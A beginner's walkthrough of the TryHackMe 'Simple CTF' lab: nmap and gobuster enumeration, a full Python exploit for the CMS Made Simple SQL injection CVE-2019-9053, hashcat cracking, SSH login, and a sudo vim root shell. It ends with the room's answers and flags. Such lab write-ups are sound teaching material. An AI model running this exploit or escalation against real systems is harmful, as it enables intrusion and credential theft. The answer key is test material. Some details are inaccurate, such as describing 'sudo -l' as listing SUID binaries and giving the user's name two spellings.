# TryHackMe |Simple-CTF | Muhammad Zaid

This TryHackMe CTF is a very good CTF for practicing the web application penetration testing as a beggener in thid CTF you will practice 
- Web Application Pnetesting
- CVE-CVE-2019-9053
- Privelege Escalation
- Brute Forcing
- Hash Cracking
- Initial Access
- Scanning
- Web Fuzzing

the link to the room is : https://tryhackme.com/room/easyctf  

<img width="1533" height="785" alt="image" src="https://github.com/user-attachments/assets/42b747a0-0261-46fe-974a-f8671a37cbd3" />

## Step 1 using Nmap
before we interact with target we should know what it is running such as open ports running services

```
# Nmap 7.99 scan initiated Thu Oct  8 20:45:51 2026 as: /usr/lib/nmap/nmap --privileged -A -T4 -vv -oN scan.txt 10.113.138.224
Nmap scan report for 10.113.138.224
Host is up, received reset ttl 62 (0.18s latency).
Scanned at 2026-10-08 20:45:52 PKT for 73s
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.226
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 5.14 - 6.8 (91%), Linux 3.10 - 3.13 (90%), Linux 4.15 (88%), Crestron XPanel control system (86%), Amazon Linux AMI 2018.03 (Linux 4.14) (86%), Linux 3.8 - 3.16 (86%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=10/8%OT=21%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=6AC7BAF9%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10C%TI=Z%II=I%TS=A)
SEQ(SP=FE%GCD=1%ISR=109%TI=Z%II=I%TS=A)
OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%TG=40%W=6903%O=M4E8NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 20.676 days (since Fri Sep 18 04:34:19 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   138.88 ms 192.168.128.1
2   ...
3   153.45 ms 10.113.138.224

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  8 20:47:05 2026 -- 1 IP address (1 host up) scanned in 73.80 seconds
```
what this scan tells us the port 21 is open but the connection is being timed out so we cannot consider it as further enemeration
the port 80 tells us the web service running such as HTTP
and the 2222 is running ssh service and this is not the standard ssh port for connecting to this we need credentials that we don't have for now so we can go further in enumeration.

## Directory Fuzzing using gobuster
the gobuster tools is use to web fuzzing we will use it for finding hidden directories in a web application

<img width="875" height="190" alt="image" src="https://github.com/user-attachments/assets/6e44618e-46ef-4aeb-9951-9f8f2fc7d40d" />

the most interesting directory is `/simple` we will explore this directory 

i was exploring the web page and i saw the cms made simple version 2.2.8 

<img width="1535" height="645" alt="image" src="https://github.com/user-attachments/assets/ffd7df6c-8843-4a19-9b2d-62fa1688e6ab" />

i search for the exploit 
<img width="1510" height="782" alt="image" src="https://github.com/user-attachments/assets/f8b8a365-296b-4301-81bd-53d6dcfdfd67" />

the CVE number is this `CVE-2019-9053 `
we can use this exploit to get initial access in the server 

## Step 3 Exploitation
```
python3 exp.py -u http://10.113.138.224/simple/ --crack /usr/share/wordlists/rockyou.txt
```
use this command 

### Exploit 
```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 16-11-2025
# Exploit Author: Daniele Scanu @ Certimeter Group
# Updated by: Shubham P
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Kali 6.10.11
# CVE : CVE-2019-9053 (46635)
#Updated the script to work with latest python versions, especially print()
#Added Exception Handling for each function
#You can also calibrate time.sleep inside the exception handling blocks depending on response and connection timeout errors

import requests
from requests.exceptions import ConnectionError
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print ("[+] Specify an url target")
    print ("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print ("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print ("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 2 #Change this depending on output accuracy. 1-3 is the sweet spot in my experience
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist,"r",encoding="latin-1")
    for line in dict.readlines():
        line = line.rstrip("\r\n") #strip newline
        beautify_print_try(line)
        if hashlib.md5((salt + line).encode("latin-1")).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
        
    dict.close()

def beautify_print_try(value):
    global output
    print ("\033c")
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print ("\033c")
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            try:
            	r = session.get(url,timeout=15) #Calibrate it according to your network latency
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
            
            	
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            
            try:
            	r = session.get(url,timeout=15)#Calibrate it according to your network latency
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
            
            	
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)           
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
           
            try:
            	r = session.get(url,timeout=10)#Added Exception Handling.Calibrate it according to your network latency
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
            
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)   
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            try:
            	r = session.get(url,timeout=10)#Added Exception Handling
            except Exception as e:
            	print(f"[!] Connection error: {e}. Retrying...")
            	#time.sleep(1)
            	continue
                        	
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
            #time.sleep(0.1)    
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print (colored("[*] Now try to crack password"))
    crack_password()

beautify_print()
```
it will give you the credentials 

<img width="871" height="250" alt="image" src="https://github.com/user-attachments/assets/8f95a7ea-29c3-49a0-adc9-33058d38b2b7" />

we found the user name and password hash we can perform offline hash cracking attack to crack the hash 

## Step 4 Cracking Using Hashcat
hashcat is the most powerful tools for cracking hashes for this we can use this command
```
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
```
and the hashcat crack the hash
```bash
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-1334U, 1454/2909 MB (1454 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash
* Register-Limit

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (899 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Thu Oct  8 21:51:58 2026 (1 sec)
Time.Estimated...: Thu Oct  8 21:51:59 2026 (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-31 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   957.2 kH/s (1.12ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> oooooo
Hardware.Mon.#01.: Util: 27%

Started: Thu Oct  8 21:51:57 2026
Stopped: Thu Oct  8 21:52:00 2026
```

the password is secret 
## Step 5 Initial Access (SSH)
now we have the credentials we can connect to the target using ssh 
username = mitch
password = secret

```bash
ssh mitch@10.113.138.224 -p 2222
```
and get the user flag 

<img width="790" height="102" alt="image" src="https://github.com/user-attachments/assets/b85b8310-390b-420c-a703-40c3470e2c69" />

now we obtained the user flag and the lab also asking the another user in the home directory 

<img width="610" height="272" alt="image" src="https://github.com/user-attachments/assets/4aef1a79-d962-456f-a90f-eba5d6693de1" />

which was `sunbat`

## Step 6 Escalating Privileges
currently we are not the root user instead we are the normal user with limited permissions so we have to escalate our privileges from normal user to root user 

for this we can run the command `sudo -l` this command will return the SUID binaries meaning that we can run these binaries as a root user even if we are not 
<img width="1045" height="73" alt="image" src="https://github.com/user-attachments/assets/425e3b16-56b6-4721-b753-12a55f6b03aa" />

i checked the SUID binaries and i notice that if i run the vim binary so it will return me a root shell so i researched about it.
i asked to perplexity ai and it gave me result
<img width="677" height="402" alt="image" src="https://github.com/user-attachments/assets/2b258a6b-9338-44b5-80e2-1f2638952170" />

```bash
sudo vim -c ':!/bin/sh'
```
i ran this command and i got the root shell 

<img width="757" height="253" alt="image" src="https://github.com/user-attachments/assets/81d6458f-3a95-4201-b87f-246215345f59" />
and also captured the root flag 

## Final Step Answers of the Questions
Q1 : How many services are running under port 1000?
Ans : 2

Q2 : What is running on the higher port?
Ans : ssh

Q3 : What's the CVE you're using against the application?
Ans : CVE-2019-9053

Q4 : To what kind of vulnerability is the application vulnerable?
Ans 5 : SQLi

Q5 : What's the password?
Ans : secret

Q6 : Where can you login with the details obtained?
Ans : ssh

Q7 : What's the user flag?
Ans : G00d j0b, keep up!

Q8 : Is there any other user in the home directory? What's its name?
Ans : sunbath

Q9 : What can you leverage to spawn a privileged shell?
Ans : vim

Q10 : W3ll d0n3. You made it!

I hope this will help you!!!
